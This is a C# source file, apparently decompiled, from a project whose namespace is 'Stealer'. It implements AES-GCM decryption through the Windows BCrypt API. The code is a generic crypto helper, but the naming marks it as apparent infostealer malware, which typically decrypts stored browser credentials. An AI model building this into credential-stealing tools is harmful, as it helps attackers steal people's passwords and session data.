using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Stealer;

internal class cAesGcm
{
	public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
	{
		IntPtr intPtr = OpenAlgorithmProvider(cBCrypt.BCRYPT_AES_ALGORITHM, cBCrypt.MS_PRIMITIVE_PROVIDER, cBCrypt.BCRYPT_CHAIN_MODE_GCM);
		IntPtr hKey;
		IntPtr hglobal = ImportKey(intPtr, key, out hKey);
		cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo = new cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
		byte[] array2;
		using (pPaddingInfo)
		{
			byte[] array = new byte[MaxAuthTagSize(intPtr)];
			int pcbResult = 0;
			uint num = cBCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref pPaddingInfo, array, array.Length, null, 0, ref pcbResult, 0);
			if (num != 0)
			{
				throw new CryptographicException($"BCrypt.BCryptDecrypt() (get size) failed with status code: {num}");
			}
			array2 = new byte[pcbResult];
			num = cBCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref pPaddingInfo, array, array.Length, array2, array2.Length, ref pcbResult, 0);
			if (num == cBCrypt.STATUS_AUTH_TAG_MISMATCH)
			{
				throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");
			}
			if (num != 0)
			{
				throw new CryptographicException($"BCrypt.BCryptDecrypt() failed with status code:{num}");
			}
		}
		cBCrypt.BCryptDestroyKey(hKey);
		Marshal.FreeHGlobal(hglobal);
		cBCrypt.BCryptCloseAlgorithmProvider(intPtr, 0u);
		return array2;
	}

	private int MaxAuthTagSize(IntPtr hAlg)
	{
		byte[] property = GetProperty(hAlg, cBCrypt.BCRYPT_AUTH_TAG_LENGTH);
		return BitConverter.ToInt32(new byte[4]
		{
			property[4],
			property[5],
			property[6],
			property[7]
		}, 0);
	}

	private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
	{
		IntPtr phAlgorithm = IntPtr.Zero;
		uint num = cBCrypt.BCryptOpenAlgorithmProvider(out phAlgorithm, alg, provider, 0u);
		if (num != 0)
		{
			throw new CryptographicException($"BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{num}");
		}
		byte[] bytes = Encoding.Unicode.GetBytes(chainingMode);
		num = cBCrypt.BCryptSetProperty(phAlgorithm, cBCrypt.BCRYPT_CHAINING_MODE, bytes, bytes.Length, 0);
		if (num != 0)
		{
			throw new CryptographicException($"BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{num}");
		}
		return phAlgorithm;
	}

	private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
	{
		byte[] property = GetProperty(hAlg, cBCrypt.BCRYPT_OBJECT_LENGTH);
		int num = BitConverter.ToInt32(property, 0);
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		byte[] array = Concat(cBCrypt.BCRYPT_KEY_DATA_BLOB_MAGIC, BitConverter.GetBytes(1), BitConverter.GetBytes(key.Length), key);
		uint num2 = cBCrypt.BCryptImportKey(hAlg, IntPtr.Zero, cBCrypt.BCRYPT_KEY_DATA_BLOB, out hKey, intPtr, num, array, array.Length, 0u);
		if (num2 != 0)
		{
			throw new CryptographicException($"BCrypt.BCryptImportKey() failed with status code:{num2}");
		}
		return intPtr;
	}

	private byte[] GetProperty(IntPtr hAlg, string name)
	{
		int pcbResult = 0;
		uint num = cBCrypt.BCryptGetProperty(hAlg, name, null, 0, ref pcbResult, 0u);
		if (num != 0)
		{
			throw new CryptographicException($"BCrypt.BCryptGetProperty() (get size) failed with status code:{num}");
		}
		byte[] array = new byte[pcbResult];
		num = cBCrypt.BCryptGetProperty(hAlg, name, array, array.Length, ref pcbResult, 0u);
		if (num != 0)
		{
			throw new CryptographicException($"BCrypt.BCryptGetProperty() failed with status code:{num}");
		}
		return array;
	}

	public byte[] Concat(params byte[][] arrays)
	{
		int num = 0;
		foreach (byte[] array in arrays)
		{
			if (array != null)
			{
				num += array.Length;
			}
		}
		byte[] array2 = new byte[num - 1 + 1];
		int num2 = 0;
		foreach (byte[] array3 in arrays)
		{
			if (array3 != null)
			{
				Buffer.BlockCopy(array3, 0, array2, num2, array3.Length);
				num2 += array3.Length;
			}
		}
		return array2;
	}
}
